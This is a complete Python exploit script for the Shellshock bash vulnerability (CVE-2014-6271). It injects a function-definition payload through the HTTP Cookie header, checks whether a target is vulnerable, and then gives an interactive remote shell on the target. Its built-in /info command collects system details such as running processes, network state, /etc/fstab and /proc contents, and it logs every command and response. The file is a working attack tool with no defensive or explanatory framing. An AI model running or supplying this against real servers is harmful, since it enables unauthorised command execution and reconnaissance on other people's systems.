# Author: orange@chroot.org, inndy@tdohacker.org

import sys, os, hashlib, random, requests, time

def usage():
    print('python %s <url>' % sys.argv[0])
    exit()

def send_cmd(url, cmd):
    payload = '() { :;};echo Content-type:text/plain;echo;%s;exit' % cmd
    HEADERS = {
        'Cookie': payload
    }
    return requests.get(url, headers = HEADERS, allow_redirects = False,
                        verify = False)

def execute(url, cmd, path, i, print_cmd = False):
    if print_cmd:
        print('Execute: %s' % cmd)
    r = send_cmd(url, cmd)
    res = r.content
    if type(i) == int:
        open('%s/%.4d-in.txt' % (path, i), 'w').write(cmd)
        open('%s/%.4d-out.txt' % (path, i), 'wb').write(res)
    elif i != None:
        open('%s/%s-in.txt' % (path, i), 'w').write(cmd)
        open('%s/%s-out.txt' % (path, i), 'wb').write(res)
    print(res.decode('ascii'))
    return r, res

def vulnerable_test(url):
    rnd = random.Random()
    for i in range(4):
        s = rnd.sample('0123456789abcdefghijklmnopqrstuvwxyz', 16)
        s = ''.join(s)
        r = send_cmd(url, 'echo %s' % s)
        if s.encode('ascii') not in r.content:
            return False
    return True

def readline(p):
    try:
        try:
            return raw_input(p)
        except:
            return input(p)
    except EOFError:
        return ''

def main():
    if len(sys.argv) < 2:
        usage()

    url = sys.argv[1]
    dir_name = hashlib.md5(url.encode('ascii')).hexdigest()
    date = "%x" % time.time()
    path = 'log/%s-%s' % (dir_name, date)

    if not vulnerable_test(url):
        print('This site is not vulnerable.')
        exit(1)

    try:
        os.makedirs(path, 0o755, True)
    except OSError:
        sys.stderr.write('CAN NOT mkdir\n')
        exit(1)

    open('%s/url.txt' % path, 'w').write(url)

    i = 0
    cmd = None
    print('This site is vulnerable.')
    print('/help for usage')
    while True:
        cmd = readline('CVE-2014-6271 $ ').strip()
        if len(cmd) == 0 or cmd == '/exit':
            break
        elif cmd == '/info':
            execute(url, '/usr/bin/whoami', path, 'whoami', True)
            execute(url, '/usr/bin/who', path, 'who', True)
            execute(url, '/bin/ps aux', path, 'ps', True)
            execute(url, '/bin/netstat', path, 'netstat', True)
            execute(url, '/bin/cat /proc/cpuinfo', path, 'cpuinfo', True)
            execute(url, '/bin/cat /etc/issue', path, 'cat--etc-issue', True)
            execute(url, '/bin/cat /etc/fstab', path, 'cat--etc-fstab', True)
            execute(url, '/bin/cat /proc/version', path, 'version', True)
            execute(url, '/bin/cat /proc/mounts', path, 'mount', True)
            execute(url, '/bin/ls -al /tmp', path, 'ls-tmp', True)
            execute(url, '/bin/ls -al /var', path, 'ls-var', True)
            execute(url, '/bin/df', path, 'df', True)
        elif cmd == '/help':
            print('/help    Show this message')
            print('/info    Gather basic information')
            print('/exit    Exit shell')
            print('')
            continue
        elif cmd == '/':
            continue
        i += 1
        execute(url, cmd, path, i)

if __name__ == '__main__':
    main()
